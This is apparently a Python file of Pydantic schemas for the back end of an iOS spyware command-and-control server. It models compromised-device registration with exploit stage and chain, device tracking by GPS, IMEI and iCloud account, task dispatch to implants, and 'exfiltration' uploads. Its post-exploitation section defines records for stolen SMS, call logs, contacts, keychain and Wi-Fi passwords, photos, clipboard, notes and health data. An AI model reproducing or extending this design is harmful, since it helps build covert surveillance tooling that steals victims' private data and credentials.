"""Pydantic 数据模型和验证"""

from datetime import datetime
from typing import Optional, List, Dict, Any, Literal
from pydantic import BaseModel, Field, validator


# ==================== 设备相关模型 ====================

class DeviceRegister(BaseModel):
    """设备注册请求"""
    device_uuid: str = Field(..., description="设备唯一标识符")
    device_model: Optional[str] = Field(None, description="设备型号")
    ios_version: Optional[str] = Field(None, description="iOS版本")
    chipset: Optional[str] = Field(None, description="芯片型号")
    user_agent: Optional[str] = Field(None, description="用户代理")
    exploit_stage: Optional[str] = Field(None, description="Exploit阶段")
    exploit_chain: Optional[str] = Field(None, description="Exploit链")
    runtime_type: Optional[str] = Field(None, description="运行时类型")
    has_pac: Optional[bool] = Field(False, description="是否支持PAC")
    pac_integrity: Optional[bool] = Field(None, description="PAC完整性")
    screen_resolution: Optional[str] = Field(None, description="屏幕分辨率")
    battery_level: Optional[int] = Field(None, ge=0, le=100, description="电池电量")
    network_type: Optional[str] = Field(None, description="网络类型")
    latitude: Optional[float] = Field(None, description="纬度")
    longitude: Optional[float] = Field(None, description="经度")
    altitude: Optional[float] = Field(None, description="海拔")
    accuracy: Optional[float] = Field(None, description="精度")
    phone_number: Optional[str] = Field(None, description="电话号码")
    imei: Optional[str] = Field(None, description="IMEI")
    serial_number: Optional[str] = Field(None, description="序列号")
    icloud_account: Optional[str] = Field(None, description="iCloud账户")
    device_name: Optional[str] = Field(None, description="设备名称")
    locale: Optional[str] = Field(None, description="语言环境")
    timezone: Optional[str] = Field(None, description="时区")
    extra: Optional[Dict[str, Any]] = Field(None, description="额外信息")


class DeviceHeartbeat(BaseModel):
    """设备心跳请求"""
    device_uuid: str = Field(..., description="设备唯一标识符")
    status: str = Field("online", description="设备状态")
    battery_level: Optional[int] = Field(None, ge=0, le=100, description="电池电量")
    exploit_stage: Optional[str] = Field(None, description="Exploit阶段")
    extra: Optional[Dict[str, Any]] = Field(None, description="额外信息")


class DeviceLocationUpdate(BaseModel):
    """设备位置更新"""
    device_uuid: str = Field(..., description="设备唯一标识符")
    latitude: float = Field(..., description="纬度")
    longitude: float = Field(..., description="经度")
    altitude: Optional[float] = Field(None, description="海拔")
    accuracy: Optional[float] = Field(None, description="精度")


class DeviceOut(BaseModel):
    """设备输出模型"""
    id: int
    device_uuid: str
    device_model: Optional[str]
    ios_version: Optional[str]
    ios_version_numeric: Optional[int]
    chipset: Optional[str]
    user_agent: Optional[str]
    ip_address: Optional[str]
    last_seen: datetime
    created_at: datetime
    first_exploit_at: Optional[datetime]
    status: str
    exploit_stage: Optional[str]
    exploit_chain: Optional[str]
    runtime_type: Optional[str]
    has_pac: bool
    pac_integrity: Optional[bool]
    screen_resolution: Optional[str]
    battery_level: Optional[int]
    network_type: Optional[str]
    latitude: Optional[float]
    longitude: Optional[float]
    altitude: Optional[float]
    accuracy: Optional[float]
    location_updated_at: Optional[datetime]
    phone_number: Optional[str]
    imei: Optional[str]
    serial_number: Optional[str]
    icloud_account: Optional[str]
    device_name: Optional[str]
    locale: Optional[str]
    timezone: Optional[str]
    total_memory: Optional[int]
    available_memory: Optional[int]
    total_disk: Optional[int]
    available_disk: Optional[int]
    extra: Optional[Dict[str, Any]]
    notes: Optional[str]
    total_tasks: int
    completed_tasks: int
    failed_tasks: int
    total_exfil: int
    last_activity: Optional[datetime]

    class Config:
        from_attributes = True


# ==================== 任务相关模型 ====================

class TaskCreate(BaseModel):
    """创建任务请求"""
    device_uuid: str = Field(..., description="设备UUID")
    task_type: str = Field(..., description="任务类型")
    payload: Optional[str] = Field(None, description="任务载荷")
    priority: Optional[int] = Field(0, description="优先级")
    timeout_seconds: Optional[int] = Field(300, description="超时时间")
    metadata: Optional[Dict[str, Any]] = Field(None, description="任务元数据")


class TaskBatchCreate(BaseModel):
    """批量创建任务"""
    device_uuids: List[str] = Field(..., description="设备UUID列表")
    task_type: str = Field(..., description="任务类型")
    payload: Optional[str] = Field(None, description="任务载荷")
    priority: Optional[int] = Field(0, description="优先级")
    timeout_seconds: Optional[int] = Field(300, description="超时时间")
    metadata: Optional[Dict[str, Any]] = Field(None, description="任务元数据")


class TaskResult(BaseModel):
    """任务结果提交"""
    task_id: int = Field(..., description="任务ID")
    status: str = Field(..., description="任务状态")
    result: Optional[str] = Field(None, description="任务结果")
    error_message: Optional[str] = Field(None, description="错误消息")
    metadata: Optional[Dict[str, Any]] = Field(None, description="结果元数据")


class TaskOut(BaseModel):
    """任务输出模型"""
    id: int
    device_uuid: str
    task_type: str
    payload: Optional[str]
    status: str
    result: Optional[str]
    error_message: Optional[str]
    created_at: datetime
    started_at: Optional[datetime]
    completed_at: Optional[datetime]
    priority: int
    retry_count: int
    timeout_seconds: int
    task_metadata: Optional[Dict[str, Any]]
    parent_task_id: Optional[int]

    class Config:
        from_attributes = True


# ==================== 数据外泄相关模型 ====================

class ExfilUpload(BaseModel):
    """数据外泄上传"""
    device_uuid: str = Field(..., description="设备UUID")
    category: str = Field(..., description="数据类别")
    path: Optional[str] = Field(None, description="文件路径")
    description: Optional[str] = Field(None, description="描述")
    file_size: Optional[int] = Field(None, description="文件大小")
    content: Optional[str] = Field(None, description="内容（base64编码）")
    mime_type: Optional[str] = Field(None, description="MIME类型")
    metadata: Optional[Dict[str, Any]] = Field(None, description="元数据")
    task_id: Optional[int] = Field(None, description="关联任务ID")


class ExfilOut(BaseModel):
    """数据外泄输出"""
    id: int
    device_uuid: str
    category: str
    path: Optional[str]
    description: Optional[str]
    file_size: Optional[int]
    file_path: Optional[str]
    content_preview: Optional[str]
    mime_type: Optional[str]
    created_at: datetime
    metadata: Optional[Dict[str, Any]]
    task_id: Optional[int]

    class Config:
        from_attributes = True


# ==================== 日志相关模型 ====================

class DeviceLogCreate(BaseModel):
    """设备日志创建"""
    device_uuid: str = Field(..., description="设备UUID")
    stage: str = Field(..., description="阶段")
    status: str = Field(..., description="状态")
    message: Optional[str] = Field(None, description="消息")
    elapsed_ms: Optional[int] = Field(None, description="耗时（毫秒）")
    metadata: Optional[Dict[str, Any]] = Field(None, description="元数据")
    log_level: str = Field("INFO", description="日志级别")


class DeviceLogOut(BaseModel):
    """设备日志输出"""
    id: int
    device_uuid: str
    stage: str
    status: str
    message: Optional[str]
    elapsed_ms: Optional[int]
    created_at: datetime
    metadata: Optional[Dict[str, Any]]
    log_level: str

    class Config:
        from_attributes = True


# ==================== 后渗透数据模型 ====================

class ContactData(BaseModel):
    """联系人数据"""
    device_uuid: str = Field(..., description="设备UUID")
    display_name: Optional[str] = Field(None, description="显示名称")
    phone_numbers: Optional[List[Dict[str, str]]] = Field(None, description="电话号码列表")
    emails: Optional[List[Dict[str, str]]] = Field(None, description="邮箱列表")
    addresses: Optional[List[Dict[str, str]]] = Field(None, description="地址列表")
    organization: Optional[str] = Field(None, description="组织")
    job_title: Optional[str] = Field(None, description="职位")
    birthday: Optional[datetime] = Field(None, description="生日")
    notes: Optional[str] = Field(None, description="备注")
    contact_id: Optional[str] = Field(None, description="联系人ID")


class SMSData(BaseModel):
    """短信数据"""
    device_uuid: str = Field(..., description="设备UUID")
    sender: Optional[str] = Field(None, description="发送者")
    recipient: Optional[str] = Field(None, description="接收者")
    body: Optional[str] = Field(None, description="短信内容")
    date_sent: Optional[datetime] = Field(None, description="发送时间")
    date_read: Optional[datetime] = Field(None, description="阅读时间")
    message_id: Optional[str] = Field(None, description="消息ID")
    is_read: bool = Field(False, description="是否已读")
    is_sent: bool = Field(False, description="是否发送")
    attachment_count: int = Field(0, description="附件数量")


class CallData(BaseModel):
    """通话数据"""
    device_uuid: str = Field(..., description="设备UUID")
    phone_number: Optional[str] = Field(None, description="电话号码")
    call_type: Optional[str] = Field(None, description="通话类型")
    duration: Optional[int] = Field(None, description="通话时长（秒）")
    date_called: Optional[datetime] = Field(None, description="通话时间")
    contact_name: Optional[str] = Field(None, description="联系人名称")
    location: Optional[str] = Field(None, description="通话地点")


class KeychainData(BaseModel):
    """钥匙串数据"""
    device_uuid: str = Field(..., description="设备UUID")
    service: Optional[str] = Field(None, description="服务名称")
    account: Optional[str] = Field(None, description="账户名")
    password: Optional[str] = Field(None, description="密码")
    label: Optional[str] = Field(None, description="标签")
    creation_date: Optional[datetime] = Field(None, description="创建时间")
    modification_date: Optional[datetime] = Field(None, description="修改时间")
    access_group: Optional[str] = Field(None, description="访问组")
    accessible: Optional[str] = Field(None, description="访问权限")


class PhotoData(BaseModel):
    """照片数据"""
    device_uuid: str = Field(..., description="设备UUID")
    album_name: Optional[str] = Field(None, description="相册名称")
    file_path: Optional[str] = Field(None, description="文件路径")
    file_name: Optional[str] = Field(None, description="文件名")
    file_size: Optional[int] = Field(None, description="文件大小")
    width: Optional[int] = Field(None, description="宽度")
    height: Optional[int] = Field(None, description="高度")
    orientation: Optional[int] = Field(None, description="方向")
    date_taken: Optional[datetime] = Field(None, description="拍摄时间")
    date_modified: Optional[datetime] = Field(None, description="修改时间")
    location: Optional[Dict[str, float]] = Field(None, description="位置信息")


class ClipboardData(BaseModel):
    """剪贴板数据"""
    device_uuid: str = Field(..., description="设备UUID")
    content: Optional[str] = Field(None, description="剪贴板内容")
    content_type: Optional[str] = Field(None, description="内容类型")
    app_name: Optional[str] = Field(None, description="应用名称")


class AppData(BaseModel):
    """应用数据"""
    device_uuid: str = Field(..., description="设备UUID")
    bundle_id: Optional[str] = Field(None, description="Bundle ID")
    app_name: Optional[str] = Field(None, description="应用名称")
    display_name: Optional[str] = Field(None, description="显示名称")
    version: Optional[str] = Field(None, description="版本")
    build_version: Optional[str] = Field(None, description="构建版本")
    bundle_size: Optional[int] = Field(None, description="包大小")
    install_date: Optional[datetime] = Field(None, description="安装时间")
    app_category: Optional[str] = Field(None, description="应用类别")
    is_system_app: bool = Field(False, description="是否系统应用")
    is_hidden: bool = Field(False, description="是否隐藏")


class ProcessData(BaseModel):
    """进程数据"""
    device_uuid: str = Field(..., description="设备UUID")
    name: Optional[str] = Field(None, description="进程名称")
    pid: Optional[int] = Field(None, description="进程ID")
    ppid: Optional[int] = Field(None, description="父进程ID")
    path: Optional[str] = Field(None, description="路径")
    user: Optional[str] = Field(None, description="用户")
    cpu_usage: Optional[float] = Field(None, description="CPU使用率")
    memory_usage: Optional[int] = Field(None, description="内存使用")
    start_time: Optional[datetime] = Field(None, description="启动时间")
    status: Optional[str] = Field(None, description="状态")


class WiFiData(BaseModel):
    """WiFi数据"""
    device_uuid: str = Field(..., description="设备UUID")
    ssid: Optional[str] = Field(None, description="SSID")
    bssid: Optional[str] = Field(None, description="BSSID")
    security_type: Optional[str] = Field(None, description="安全类型")
    password: Optional[str] = Field(None, description="密码")
    signal_strength: Optional[int] = Field(None, description="信号强度")
    channel: Optional[int] = Field(None, description="频道")
    frequency: Optional[int] = Field(None, description="频率")
    is_saved: bool = Field(False, description="是否已保存")
    is_current: bool = Field(False, description="是否当前连接")


class BrowserHistoryData(BaseModel):
    """浏览器历史数据"""
    device_uuid: str = Field(..., description="设备UUID")
    browser_name: Optional[str] = Field(None, description="浏览器名称")
    url: Optional[str] = Field(None, description="URL")
    title: Optional[str] = Field(None, description="标题")
    visit_count: int = Field(1, description="访问次数")
    last_visited: Optional[datetime] = Field(None, description="最后访问时间")
    first_visited: Optional[datetime] = Field(None, description="首次访问时间")
    is_bookmarked: bool = Field(False, description="是否收藏")
    favicon_url: Optional[str] = Field(None, description="图标URL")


class CalendarEventData(BaseModel):
    """日历事件数据"""
    device_uuid: str = Field(..., description="设备UUID")
    title: Optional[str] = Field(None, description="标题")
    location: Optional[str] = Field(None, description="地点")
    start_date: Optional[datetime] = Field(None, description="开始时间")
    end_date: Optional[datetime] = Field(None, description="结束时间")
    all_day: bool = Field(False, description="是否全天")
    notes: Optional[str] = Field(None, description="备注")
    attendees: Optional[List[Dict[str, str]]] = Field(None, description="参与者")
    recurrence: Optional[str] = Field(None, description="重复规则")
    reminder_minutes: Optional[int] = Field(None, description="提醒时间")
    calendar_name: Optional[str] = Field(None, description="日历名称")
    event_id: Optional[str] = Field(None, description="事件ID")


class NoteData(BaseModel):
    """笔记数据"""
    device_uuid: str = Field(..., description="设备UUID")
    title: Optional[str] = Field(None, description="标题")
    content: Optional[str] = Field(None, description="内容")
    folder: Optional[str] = Field(None, description="文件夹")
    created_date: Optional[datetime] = Field(None, description="创建时间")
    modified_date: Optional[datetime] = Field(None, description="修改时间")
    is_locked: bool = Field(False, description="是否锁定")
    note_id: Optional[str] = Field(None, description="笔记ID")


class HealthData(BaseModel):
    """健康数据"""
    device_uuid: str = Field(..., description="设备UUID")
    data_type: Optional[str] = Field(None, description="数据类型")
    value: Optional[float] = Field(None, description="数值")
    unit: Optional[str] = Field(None, description="单位")
    start_date: Optional[datetime] = Field(None, description="开始时间")
    end_date: Optional[datetime] = Field(None, description="结束时间")
    source: Optional[str] = Field(None, description="数据来源")
    metadata: Optional[Dict[str, Any]] = Field(None, description="元数据")


# ==================== 管理员相关模型 ====================

class AdminLogin(BaseModel):
    """管理员登录"""
    username: str = Field(..., description="用户名")
    password: str = Field(..., description="密码")


class AdminStats(BaseModel):
    """管理员统计"""
    total_devices: int = Field(0, description="总设备数")
    online_devices: int = Field(0, description="在线设备数")
    offline_devices: int = Field(0, description="离线设备数")
    exploited_devices: int = Field(0, description="已利用设备数")
    total_tasks: int = Field(0, description="总任务数")
    pending_tasks: int = Field(0, description="待处理任务数")
    running_tasks: int = Field(0, description="运行中任务数")
    completed_tasks: int = Field(0, description="已完成任务数")
    failed_tasks: int = Field(0, description="失败任务数")
    total_exfil_count: int = Field(0, description="总外泄数据数")
    total_exfil_size: int = Field(0, description="总外泄数据大小")
    recent_devices: List[DeviceOut] = Field(default_factory=list, description="最近设备")
    recent_tasks: List[TaskOut] = Field(default_factory=list, description="最近任务")
    recent_exfil: List[ExfilOut] = Field(default_factory=list, description="最近外泄数据")


# ==================== WebSocket 消息模型 ====================

class WSMessage(BaseModel):
    """WebSocket消息"""
    type: str = Field(..., description="消息类型")
    device_uuid: Optional[str] = Field(None, description="设备UUID")
    data: Optional[Dict[str, Any]] = Field(None, description="消息数据")
    timestamp: datetime = Field(default_factory=datetime.utcnow, description="时间戳")


class WSHeartbeat(WSMessage):
    """WebSocket心跳"""
    type: Literal["heartbeat"] = "heartbeat"


class WSLog(WSMessage):
    """WebSocket日志"""
    type: Literal["log"] = "log"
    stage: Optional[str] = Field(None, description="阶段")
    status: Optional[str] = Field(None, description="状态")
    message: Optional[str] = Field(None, description="消息")


class WSTaskResult(WSMessage):
    """WebSocket任务结果"""
    type: Literal["task_result"] = "task_result"
    task_id: Optional[int] = Field(None, description="任务ID")
    result: Optional[str] = Field(None, description="结果")
    status: Optional[str] = Field(None, description="状态")


class WSRegister(WSMessage):
    """WebSocket注册"""
    type: Literal["register"] = "register"
    device_uuid: str = Field(..., description="设备UUID")


# ==================== 数据收集模型 ====================

class CollectedDataIn(BaseModel):
    """数据收集上报请求"""
    device_uuid: str = Field(..., description="设备UUID")
    category: str = Field(..., description="数据类型: device_info, keychain, wifi, cookies, localStorage, browser, filesystem, icloud, health, clipboard, sms, calls, contacts, photos, apps, processes")
    data_key: Optional[str] = Field(None, description="键名(用于去重)")
    payload: Dict[str, Any] = Field(..., description="JSON 数据")
    source: Optional[str] = Field(None, description="数据来源: js_fallback, dylib, native_bridge")
    collected_at: Optional[datetime] = Field(None, description="设备端采集时间")


class CollectedDataOut(BaseModel):
    """数据收集输出模型"""
    id: int
    device_uuid: str
    category: str
    data_key: Optional[str]
    payload: Dict[str, Any]
    source: Optional[str]
    collected_at: Optional[datetime]
    created_at: datetime

    class Config:
        from_attributes = True
